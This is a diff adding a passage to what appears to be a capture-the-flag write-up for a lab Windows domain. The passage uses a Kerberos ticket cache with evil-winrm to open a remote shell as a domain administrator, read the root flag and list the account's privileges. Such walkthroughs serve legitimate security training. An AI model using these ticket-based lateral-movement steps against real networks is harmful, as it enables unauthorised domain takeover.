@@ -529,5 +529,55 @@ SMB         dc01.vintage.htb 445    dc01             [+] Run the following comma
 Ive now generated a TGT for the domain admin since the `Administrator` account did not work
 
 ```python
+KRB5CCNAME=administraotr.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Desktop> dir
+*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Desktop> cd ../../
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+6d7e6955fc95bc42aa5fd1ea7678d862
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv
 
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
 ```
+Domain admin
